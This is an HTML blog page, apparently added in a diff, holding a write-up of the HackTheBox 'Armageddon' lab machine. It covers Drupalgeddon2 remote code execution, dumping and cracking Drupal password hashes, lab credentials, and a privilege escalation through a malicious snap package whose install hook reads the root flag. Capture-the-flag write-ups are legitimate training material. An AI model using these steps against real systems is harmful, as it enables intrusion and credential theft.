@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Armageddon // SixPraxis</title>
+    <link rel="shortcut icon" href="/images/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="SixPraxis" />
+    <meta name="description" content="Write Up for HackTheBox&#39;s Armageddon" />
+    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.802b52396e9009f466997720acea24d1773f8e6e5db6e4793067fa2dfd981e02.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Armageddon"/>
+<meta name="twitter:description" content="Write Up for HackTheBox&#39;s Armageddon"/>
+
+    <meta property="og:title" content="HTB - Armageddon" />
+<meta property="og:description" content="Write Up for HackTheBox&#39;s Armageddon" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sixpraxis.github.io/posts/armageddon/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-24T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-07-24T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
+      <h1>SixPraxis</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
+  <title>HackTheBox</title>
+  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Armageddon</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 24, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/armageddon/">armageddon</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/easy/">easy</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="armageddon">Armageddon</h1>
+<p><img src="/images/htb-armageddon/armageddon.png" alt="Armageddon"></p>
+<h3 id="contents">Contents</h3>
+<ul>
+<li><a href="#WriteUp">Write Up</a></li>
+<li><a href="#Recon">Recon</a></li>
+<li><a href="#Credentials">Credentials</a></li>
+<li><a href="#Notes">Notes</a></li>
+</ul>
+<h2 id="WriteUp">Write Up</h2>
+<p>Initial scan shows two ports, 22 and 80. Checking out the web port shows us a welcome page with a login. WFuzz finds a few directories we can check out. Looking through the files in the /includes directory points towards this being a drupal 7.56 install. Searchsploit shows multiple RCE exploits called drupalgeddon. Drupalgeddon2&rsquo;s version range matches our version, let&rsquo;s give it a shot. The python version of the exploit returns a &ldquo;Not exploitable&rdquo;, but trying the MSF version establishes a meterpreter session.</p>
+<p>We take a look at /var/www/html/sites/default/settings.php and get MySQL credentials for the drupal database, <code>drupaluser : CQHEy@9M*m23gBVj</code>. The usual python trick to upgrade our shell results in an error &ldquo;OSError: out of pty devices&rdquo;, so we won&rsquo;t be able to use mysql&rsquo;s interactive command line. Instead, we&rsquo;ll have to use -e flag to make individual queries.</p>
+<pre><code>mysql -u drupaluser -p drupal -e &quot;show tables&quot;
+mysql -u drupaluser -p drupal -e &quot;SHOW COLUMNS from users&quot;
+mysql -u drupaluser -p drupal -e &quot;SELECT uid,name,pass FROM users&quot;
+uid	name	pass
+0		
+1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
+3	testaccount	$S$DqpxXvyF7uMzypy6Mv6unhxRB0uzjanzVspXgE1pNAB/gkqJA/hF
+</code></pre><p>Great! We&rsquo;ve got two users and their Drupal7 hashed passwords. Hashcat&rsquo;s mode for Drupal7 is 7900. Using rockyou, we get <code>booboo</code> as brucetherealadmin&rsquo;s password. Using the creds with SSH gets us in! We&rsquo;ve got user.</p>
+<p><img src="/images/htb-armageddon/armageddon2.png" alt="User Flag"></p>
+<p>Sudo -l returns <code>(root) NOPASSWD: /usr/bin/snap install *</code>. It looks like we have to build our own malicious snap package. Following this super useful <a href="https://gtfobins.github.io/gtfobins/snap/">gtfobins post</a>, we can craft a snap package that executes a command as an install hook. I ran into a few problems, it seems like root can&rsquo;t write to the tmp folder, and reverse shells connect and immediately die. So, instead we write the root flag to the /etc/ folder.</p>
+<pre><code>On our machine:
+COMMAND='cat /root/root.txt &gt; /etc/output1.txt'
+SNAPNAME=snap4
+cd $(mktemp -d) &amp;&amp; mkdir -p meta/hooks &amp;&amp; printf '#!/bin/sh\n%s; false' &quot;$COMMAND&quot; &gt;meta/hooks/install &amp;&amp; chmod +x meta/hooks/install &amp;&amp; fpm -n $SNAPNAME -s dir -t snap -a all meta
+scp snap4_1.0_all.snap brucetherealadmin@10.10.10.233:/tmp/
+
+On target machine:
+sudo snap install snap4_1.0_all.snap --dangerous --devmode
+cat /etc/output1.txt
+</code></pre><p><img src="/images/htb-armageddon/armageddon3.png" alt="Root Flag"></p>
+<hr>
+<h2 id="Recon">Recon</h2>
+<p>Initial Scan:</p>
+<pre><code>nmap -sV -p- 10.10.10.233
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+</code></pre><p>WFuzz:</p>
+<pre><code>wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://armageddon.htb/FUZZ -c --hc 404
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                 
+=====================================================================
+000000419:   301        7 L      20 W       239 Ch      &quot;includes&quot;                              
+000000530:   301        7 L      20 W       235 Ch      &quot;misc&quot;                                  
+000000535:   301        7 L      20 W       238 Ch      &quot;modules&quot;                               
+000000715:   301        7 L      20 W       238 Ch      &quot;scripts&quot;                               
+000000763:   301        7 L      20 W       236 Ch      &quot;sites&quot;                              
+</code></pre><hr>
+<h2 id="Credentials">Credentials</h2>
+<h4 id="mysql">MySQL</h4>
+<pre><code>db 'drupal' = drupaluser : CQHEy@9M*m23gBVj
+</code></pre><h4 id="website">Website</h4>
+<pre><code>1	brucetherealadmin : booboo
+3	testaccount	$S$DqpxXvyF7uMzypy6Mv6unhxRB0uzjanzVspXgE1pNAB/gkqJA/hF
+</code></pre><h4 id="host-users">Host users:</h4>
+<pre><code>brucetherealadmin : booboo
+
+</code></pre><hr>
+<h2 id="Notes">Notes</h2>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
